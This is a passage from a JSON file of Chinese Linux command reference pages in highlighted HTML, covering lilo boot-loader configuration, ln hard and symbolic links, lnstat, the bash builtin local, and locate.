class=\"hljs-deletion\">-c：使用紧致映射模式；</span>\n<span class=\"hljs-deletion\">-C&lt;配置文件&gt;：指定lilo的配置文件；</span>\n<span class=\"hljs-deletion\">-d&lt;延迟时间&gt;：设置开机延迟时间；</span>\n<span class=\"hljs-deletion\">-D&lt;识别标签&gt;：指定开机后预设启动的操作系统，或系统核心识别标签；</span>\n<span class=\"hljs-deletion\">-f&lt;几何参数文件&gt;：指定磁盘的几何参数配置文件；</span>\n<span class=\"hljs-deletion\">-i&lt;开机磁区文件&gt;：指定欲使用的开机磁区文件，预设是/boot目录里的boot.b文件；</span>\n<span class=\"hljs-deletion\">-I&lt;识别标签&gt;：显示系统核心存放之处；</span>\n<span class=\"hljs-deletion\">-l：产生线形磁区地址；</span>\n<span class=\"hljs-deletion\">-m&lt;映射文件&gt;：指定映射文件；</span>\n<span class=\"hljs-deletion\">-P&lt;fix/ignore&gt;：决定要修复或忽略分区表的错误；</span>\n<span class=\"hljs-deletion\">-q：列出映射的系统核心文件；</span>\n<span class=\"hljs-deletion\">-r&lt;根目录&gt;：设置系统启动时欲挂入成为根目录的目录；</span>\n<span class=\"hljs-deletion\">-R&lt;执行指令&gt;：设置下次启动系统时，首先执行的指令；</span>\n<span class=\"hljs-deletion\">-s&lt;备份文件&gt;：指定备份文件；</span>\n<span class=\"hljs-deletion\">-S&lt;备份文件&gt;：强制指定备份文件；</span>\n<span class=\"hljs-deletion\">-t：不执行指令，仅列出实际执行会进行的动作；</span>\n<span class=\"hljs-deletion\">-u&lt;外围色设备代号&gt;：删除lilo；</span>\n<span class=\"hljs-deletion\">-U&lt;外围设备代号&gt;：此选项的效果和指定\"-u\"参数类似，当不检查时间戳记；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>使用 LILO 作为引导加载程序</strong> </p>\n<p>要使用 LILO 作为引导加载程序，需要做的事情取决于是要进行全新安装还是要让已经安装的 Linux 改为使用 LILO。如果是要进行全新安装，那么直接跳转到 配置 LILO 那一节。如果已经安装了某个 Linux 发行版，那么通常可以选择安装并配置 LILO（并可以将机器引导到新的 Linux 安装）。</p>\n<p>要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/sbin/</span>lilo -v -v\n</code></pre>\n<p>这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。</p>\n<p> <strong>配置 LILO</strong> </p>\n<p>LILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的：</p>\n<p>主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 grub 术语中是 hd0,0）。</p>\n<p>从 HDD（物理磁盘 2）上安装了 Red Hat Linux；root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。</p>\n<p>lilo.conf 示例文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">boot</span>=/dev/hda\n<span class=\"hljs-attribute\">map</span>=/boot/map\n<span class=\"hljs-attribute\">install</span>=/boot/boot.b\nprompt\n<span class=\"hljs-attribute\">timeout</span>=100\ncompact\n<span class=\"hljs-attribute\">default</span>=Linux\n<span class=\"hljs-attribute\">image</span>=/boot/vmlinuz-2.4.18-14\n    <span class=\"hljs-attribute\">label</span>=Linux\n    <span class=\"hljs-attribute\">root</span>=/dev/hdb3\n    read-only\n    <span class=\"hljs-attribute\">password</span>=linux\n<span class=\"hljs-attribute\">other</span>=/dev/hda\n    <span class=\"hljs-attribute\">label</span>=WindowsXP\n</code></pre>\n<p>配置文件选项说明：</p>\n<ul>\n<li>  boot= 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序；然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。</li>\n<li>  map= 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！</li>\n<li>  install= 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！</li>\n<li>  prompt= 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。</li>\n<li>  timeout= 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。</li>\n<li>  compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。</li>\n<li>  default= 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。</li>\n<li>  对于允许用户引导到的每一个 Linux 版本，都应该指定 image= 及以下三个选项。image 选项指定希望 引导到的内核版本。</li>\n<li>  label= 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格；否则，引导那个文件时会出现无法预期的错误。）</li>\n<li>  root= 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。</li>\n<li>  read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。</li>\n<li>  password= 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。</li>\n<li>  other= 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。</li>\n<li>  label= 与所有其他 label 选项相同。</li>\n</ul>\n<p>在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（man lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/sbin/</span>lilo -v -v\n</code></pre>\n<p><code>-v -v</code>标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。</p>\n<p> <strong>初始引导过程</strong> </p>\n<p>当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 都表示出现了问题：</p>\n<p>L：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。</p>\n<p>LI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。</p>\n<p>LIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。</p>\n<p>LIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。</p>\n<p>LIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。</p>\n<p>LILO：LILO 成功被加载，没有出现任何错误。</p>\n<p> <strong>引导时的附加配置</strong> </p>\n<p>LILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导<code>/dev/hdb3</code>，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。</p>\n<p>不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行<code>/sbin/lilo</code>时指定选项。</p>\n<p>关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用<code>boot=/dev/fd0</code>替换<code>boot=/dev/hda</code>。那样，如果弄乱了lilo.conf文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将lilo.conf修改回<code>boot=/dev/hda</code>，然后最后一次运行<code>/sbin/lilo</code>来上传修改。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ln",
        "des": "用来为文件创建链接",
        "body": "<h1 id=\"ln\">ln</h1>\n<p>用来为文件创建链接</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ln命令</strong> 用来为文件创建链接，链接类型分为硬链接和符号链接两种，默认的链接类型是硬链接。如果要创建符号链接必须使用\"-s\"选项。</p>\n<p>注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ln <span class=\"hljs-selector-attr\">[选项]</span>... <span class=\"hljs-selector-attr\">[-T]</span> 目标 链接名    (第一种格式)\n　或：ln <span class=\"hljs-selector-attr\">[选项]</span>... 目标        (第二种格式)\n　或：ln <span class=\"hljs-selector-attr\">[选项]</span>... 目标... 目录    (第三种格式)\n　或：ln <span class=\"hljs-selector-attr\">[选项]</span>... -t 目录 目标...    (第四种格式)\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">    <span class=\"hljs-built_in\">--backup[=CONTROL]</span>  为每个已存在的目标文件创建备份文件\n-<span class=\"hljs-string\">b</span>        类似<span class=\"hljs-built_in\">--backup，但不接受任何参数</span>\n-<span class=\"hljs-string\">d</span>, -<span class=\"hljs-string\">F</span>, <span class=\"hljs-built_in\">--directory</span>   创建指向目录的硬链接(只适用于超级用户)\n-<span class=\"hljs-string\">f</span>, <span class=\"hljs-built_in\">--force</span>     强行删除任何已存在的目标文件\n-<span class=\"hljs-string\">i</span>, <span class=\"hljs-built_in\">--interactive</span>           覆盖既有文件之前先询问用户；\n-<span class=\"hljs-string\">L</span>, <span class=\"hljs-built_in\">--logical</span>               取消引用作为符号链接的目标\n-<span class=\"hljs-string\">n</span>, <span class=\"hljs-built_in\">--no-dereference</span>        把符号链接的目的目录视为一般文件；\n-<span class=\"hljs-string\">P</span>, <span class=\"hljs-built_in\">--physical</span>              直接将硬链接到符号链接\n-<span class=\"hljs-string\">r</span>, <span class=\"hljs-built_in\">--relative</span>              创建相对于链接位置的符号链接\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--symbolic</span>              对源文件建立符号链接，而非硬链接；\n-<span class=\"hljs-string\">S</span>, <span class=\"hljs-built_in\">--suffix=SUFFIX</span>         用<span class=\"hljs-string\">\"-b\"</span>参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-<span class=\"hljs-string\">S</span>”参数来改变它；\n-<span class=\"hljs-string\">t</span>, <span class=\"hljs-built_in\">--target-directory=DIRECTORY</span>  指定要在其中创建链接的<span class=\"hljs-string\">DIRECTORY</span>\n-<span class=\"hljs-string\">T</span>, <span class=\"hljs-built_in\">--no-target-directory</span>   将“<span class=\"hljs-string\">LINK_NAME</span>”视为常规文件\n-<span class=\"hljs-string\">v</span>, <span class=\"hljs-built_in\">--verbose</span>               打印每个链接文件的名称\n    <span class=\"hljs-built_in\">--help</span>    显示此帮助信息并退出\n    <span class=\"hljs-built_in\">--version</span>   显示版本信息并退出\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  源文件：指定链接的源文件。如果使用<code>-s</code>选项创建符号链接，则“源文件”可以是文件或者目录。创建硬链接时，则“源文件”参数只能是文件；</li>\n<li>  目标文件：指定源文件的目标链接文件。</li>\n</ul>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">none</span>, <span class=\"hljs-literal\">off</span>       <span class=\"hljs-comment\"># 不进行备份(即使使用了--backup 选项)</span>\nnumbered, t     <span class=\"hljs-comment\"># 备份文件加上数字进行排序</span>\nexisting, nil   <span class=\"hljs-comment\"># 若有数字的备份文件已经存在则使用数字，否则使用普通方式备份</span>\nsimple, never   <span class=\"hljs-comment\"># 永远使用普通方式备份</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>将目录<code>/usr/mengqc/mub1</code>下的文件m2.c链接到目录<code>/usr/liu</code>下的文件a2.c</p>\n<pre><code class=\"language-shell\">cd <span class=\"hljs-regexp\">/usr/m</span>engqc\nln <span class=\"hljs-regexp\">/mub1/m</span>2.c <span class=\"hljs-regexp\">/usr/</span>liu/a2.c\n</code></pre>\n<p>在执行ln命令之前，目录<code>/usr/liu</code>中不存在a2.c文件。执行ln之后，在<code>/usr/liu</code>目录中才有a2.c这一项，表明m2.c和a2.c链接起来（注意，二者在物理上是同一文件），利用<code>ls -l</code>命令可以看到链接数的变化。</p>\n<p>在目录<code>/usr/liu</code>下建立一个符号链接文件abc，使它指向目录<code>/usr/mengqc/mub1</code></p>\n<pre><code class=\"language-shell\">ln -s <span class=\"hljs-regexp\">/usr/m</span>engqc<span class=\"hljs-regexp\">/mub1 /u</span>sr<span class=\"hljs-regexp\">/liu/</span>abc\n</code></pre>\n<p>执行该命令后，<code>/usr/mengqc/mub1</code>代表的路径将存放在名为<code>/usr/liu/abc</code>的文件中。</p>\n<h2 id=\"扩展知识\">扩展知识</h2>\n<p>Linux具有为一个文件起多个名字的功能，称为链接。被链接的文件可以存放在相同的目录下，但是必须有不同的文件名，而不用在硬盘上为同样的数据重复备份。另外，被链接的文件也可以有相同的文件名，但是存放在不同的目录下，这样只要对一个目录下的该文件进行修改，就可以完成对所有目录下同名链接文件的修改。对于某个文件的各链接文件，我们可以给它们指定不同的存取权限，以控制对信息的共享和增强安全性。</p>\n<p>文件链接有两种形式，即硬链接和符号链接。</p>\n<p>ln功能说明：是为某一个文件在另外一个位置建立一个同步的链接，当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<blockquote>\n<p>:warning: ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化。</p>\n</blockquote>\n<h3 id=\"硬链接\">硬链接</h3>\n<p>建立硬链接时，在另外的目录或本目录中增加目标文件的一个目录项，这样，一个文件就登记在多个目录中。如下所示的m2.c文件就在目录mub1和liu中都建立了目录项。</p>\n<pre><code class=\"language-shell\">ls -ailR\n.:\ntotal 16\n922730 drwxr-xr-x <span class=\"hljs-number\"> 4 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 .\n393217 drwxrwxrwt.<span class=\"hljs-number\"> 9 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:19 ..\n922733 drwxr-xr-x <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 liu\n922731 -rw-r--r-- <span class=\"hljs-number\"> 3 </span>root root   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 m2.c\n922732 drwxr-xr-x <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 mub1\n\n./liu:\ntotal 8\n922733 drwxr-xr-x<span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 .\n922730 drwxr-xr-x<span class=\"hljs-number\"> 4 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 ..\n922731 -rw-r--r--<span class=\"hljs-number\"> 3 </span>root root   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 m2.c\n\n./mub1:\ntotal 8\n922732 drwxr-xr-x<span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 .\n922730 drwxr-xr-x<span class=\"hljs-number\"> 4 </span>root root<span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 ..\n922731 -rw-r--r--<span class=\"hljs-number\"> 3 </span>root root   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 17 </span>11:18 m2.c\n</code></pre>\n<p>创建硬链接后，己经存在的文件的索引节点号（inode）会被多个目录文件项使用。一个文件的硬链接数可以在目录的长列表格式的第二列中看到，无额外链接的文件的链接数为1。</p>\n<p>在默认情况下，ln命令创建硬链接。ln命令会增加链接数，rm命令会减少链接数。一个文件除非链接数为0，否则不会从文件系统中被物理地删除。</p>\n<p>对硬链接有如下限制：</p>\n<ul>\n<li>  不能对目录文件做硬链接。</li>\n<li>  不能在不同的文件系统之间做硬链接。就是说，链接文件和被链接文件必须位于同一个文件系统中。</li>\n</ul>\n<h3 id=\"符号链接\">符号链接</h3>\n<p>符号链接也称为软链接，是将一个路径名链接到一个文件。这些文件是一种特别类型的文件。事实上，它只是一个文本文件（如下所示的abc文件），其中包含它提供链接的另一个文件的路径名，如虚线箭头所示。另一个文件是实际包含所有数据的文件。所有读、写文件内容的命令被用于符号链接时，将沿着链接方向前进来访问实际的文件。</p>\n<pre><code class=\"language-shell\">$ ls -il\ntotal 0\n922736 lrwxrwxrwx<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 5 </span>Jun<span class=\"hljs-number\"> 17 </span>11:27 abc -&gt; a.txt\n922735 -rw-r--r--<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 17 </span>11:27 a.txt\n</code></pre>\n<p>与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的索引节点号；而硬链接并没有建立新文件。</p>\n<p>符号链接没有硬链接的限制，可以对目录文件做符号链接，也可以在不同文件系统之间做符号链接。</p>\n<p>用<code>ln -s</code>命令建立符号链接时，源文件最好用绝对路径名。这样可以在任何工作目录下进行符号链接。而当源文件用相对路径时，如果当前的工作路径与要创建的符号链接文件所在路径不同，就不能进行链接。</p>\n<p>符号链接保持了链接与源文件或目录之间的区别：</p>\n<ul>\n<li>  删除源文件或目录，只删除了数据，不会删除链接。一旦以同样文件名创建了源文件，链接将继续指向该文件的新数据。</li>\n<li>  在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l。</li>\n<li>  符号链接的大小是其链接文件的路径名中的字节数。</li>\n<li>  当用<code>ln -s</code>命令列出文件时，可以看到符号链接名后有一个箭头指向源文件或目录，例如<code>lrwxrwxrwx … 14 jun 20 10:20 /etc/motd-&gt;/original_file</code>其中，表示“文件大小”的数字“14”恰好说明源文件名<code>original_file</code>由14个字符构成。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "lnstat",
        "des": "显示Linux系统的网路状态",
        "body": "<h1 id=\"lnstat\">lnstat</h1>\n<p>显示Linux系统的网路状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lnstat命令</strong> 用来显示Linux系统的网路状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lnstat</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-V：显示指令版本信息；</span>\n<span class=\"hljs-deletion\">-c：指定显示网络状态的次数，每隔一定时间显示一次网络状态；</span>\n<span class=\"hljs-deletion\">-d：显示可用的文件或关键字；</span>\n<span class=\"hljs-deletion\">-i：指定两次显示网络状的间隔秒数；</span>\n<span class=\"hljs-deletion\">-k：只显示给定的关键字；</span>\n<span class=\"hljs-deletion\">-s：是否显示标题头；</span>\n<span class=\"hljs-deletion\">-w：指定每个字段所占的宽度。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "local",
        "des": "在函数内定义局部变量。",
        "body": "<h1 id=\"local\">local</h1>\n<p>在函数内定义局部变量。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">local <span class=\"hljs-comment\">[-aAfFgilnrtux]</span> <span class=\"hljs-comment\">[-p]</span> <span class=\"hljs-comment\">[name<span class=\"hljs-comment\">[=value]</span> ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>在函数内定义局部变量</li>\n<li>显示局部变量</li>\n<li>在函数内定义全局变量</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">local</span>命令的选项与<span class=\"hljs-built_in\">declare</span>命令的相同，请参考<span class=\"hljs-built_in\">declare</span>命令的选项。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name（可选）：变量名或已定义函数名。</p>\n<p>value（可选）：变量的值。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p><code>local</code>返回true除非你提供了非法选项、赋值错误或是在函数外使用<code>local</code>命令。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">相关例子请参考<span class=\"hljs-keyword\">declare</span>命令\n</code></pre>\n<h2 id=\"错误用法\">错误用法</h2>\n<ul>\n<li>在函数外使用该命令。</li>\n</ul>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令以及<code>man bash</code>、<code>info bash</code>的相应部分。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "locate",
        "des": "比 find 好用的文件查找工具",
        "body": "<h1 id=\"locate\">locate</h1>\n<p>比 find 好用的文件查找工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>locate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的数据库，之后当寻找时就只需查询这个数据库，而不必实际深入档案系统之中了。在一般的 distribution 之中，数据库的建立都被放在 crontab 中自动执行。</p>\n<p>locate命令可以在搜寻数据库时快速找到档案，数据库由updatedb程序来更新，updatedb是由cron daemon周期性建立的，locate命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是locate所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb每天会跑一次，可以由修改crontab来更新设定值。(etc/crontab)</p>\n<p>locate指定用在搜寻符合条件的档案，它会去储存档案与目录名称的数据库内，寻找合乎范本样式条件的档案或目录录，可以使用特殊字元（如”<em>” 或”?”等）来指定范本样式，如指定范本为kcpa</em>ner, locate 会找出所有起始字串为kcpa且结尾为ner的档案或目录，如名称为kcpartner若目录录名称为kcpa_ner则会列出该目录下包括 子目录在内的所有档案。</p>\n<p>locate指令和find找寻档案的功能类似，但locate是透过update程序将硬盘中的所有档案和目录资料先建立一个索引数据库，在 执行loacte时直接找该索引，查询速度会较快，索引数据库一般是由操作系统管理，但也可以直接下达update强迫系统立即修改索引数据库。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">locate <span class=\"hljs-selector-attr\">[选择参数]</span> <span class=\"hljs-selector-attr\">[样式]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>b, --basename  <span class=\"hljs-comment\"># 仅匹配路径名的基本名称</span>\n<span class=\"hljs-literal\">-</span>c, --count     <span class=\"hljs-comment\"># 只输出找到的数量</span>\n<span class=\"hljs-literal\">-</span>d, --database DBPATH <span class=\"hljs-comment\"># 使用DBPATH指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate.db</span>\n<span class=\"hljs-literal\">-</span>e, --existing  <span class=\"hljs-comment\"># 仅打印当前现有文件的条目</span>\n<span class=\"hljs-literal\">-</span>1 <span class=\"hljs-comment\"># 如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的  权限资料。</span>\n<span class=\"hljs-literal\">-</span>0, --null            <span class=\"hljs-comment\"># 在输出上带有NUL的单独条目</span>\n<span class=\"hljs-literal\">-</span>S, --statistics      <span class=\"hljs-comment\"># 不搜索条目，打印有关每个数据库的统计信息</span>\n<span class=\"hljs-literal\">-</span>q                    <span class=\"hljs-comment\"># 安静模式，不会显示任何错误讯息。</span>\n<span class=\"hljs-literal\">-</span>P, --nofollow, -H    <span class=\"hljs-comment\"># 检查文件存在时不要遵循尾随的符号链接</span>\n<span class=\"hljs-literal\">-</span>l, --limit, -n LIMIT <span class=\"hljs-comment\"># 将输出（或计数）限制为LIMIT个条目</span>\n<span class=\"hljs-literal\">-</span>n                    <span class=\"hljs-comment\"># 至多显示 n个输出。</span>\n<span class=\"hljs-literal\">-</span>m, --mmap            <span class=\"hljs-comment\"># 被忽略，为了向后兼容</span>\n<span class=\"hljs-literal\">-</span>r, --regexp REGEXP   <span class=\"hljs-comment\"># 使用基本正则表达式</span>\n    --regex           <span class=\"hljs-comment\"># 使用扩展正则表达式</span>\n<span class=\"hljs-literal\">-</span>q, --quiet           <span class=\"hljs-comment\"># 安静模式，不会显示任何错误讯息</span>\n<span class=\"hljs-literal\">-</span>s, --stdio           <span class=\"hljs-comment\"># 被忽略，为了向后兼容</span>\n<span class=\"hljs-literal\">-</span>o                    <span class=\"hljs-comment\"># 指定资料库存的名称。</span>\n<span class=\"hljs-literal\">-</span>h, --help            <span class=\"hljs-comment\"># 显示帮助</span>\n<span class=\"hljs-literal\">-</span>i, --ignore-case     <span class=\"hljs-comment\"># 忽略大小写</span>\n<span class=\"hljs-literal\">-</span>V, --version         <span class=\"hljs-comment\"># 显示版本信息</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>实例1：查找和pwd相关的所有文件</p>\n<pre><code class=\"language-shell\">root ~ # locate pwd\n<span class=\"hljs-regexp\">/bin/</span>pwd\n<span class=\"hljs-regexp\">/etc/</span>.pwd.lock\n<span class=\"hljs-regexp\">/sbin/u</span>nix_chkpwd\n<span class=\"hljs-regexp\">/usr/</span>bin/pwdx\n<span class=\"hljs-regexp\">/usr/i</span>nclude/pwd.h\n<span class=\"hljs-regexp\">/usr/</span>lib<span class=\"hljs-regexp\">/python2.7/</span>dist-packages<span class=\"hljs-regexp\">/twisted/</span>python/fakepwd.py\n<span class=\"hljs-regexp\">/usr/</span>lib<span class=\"hljs-regexp\">/python2.7/</span>dist-packages<span class=\"hljs-regexp\">/twisted/</span>python/fakepwd.pyc\n<span class=\"hljs-regexp\">/usr/</span>lib<span class=\"hljs-regexp\">/python2.7/</span>dist-packages<span class=\"hljs-regexp\">/twisted/</span>python<span class=\"hljs-regexp\">/test/</span>test_fakepwd.py\n<span class=\"hljs-regexp\">/usr/</span>lib<span 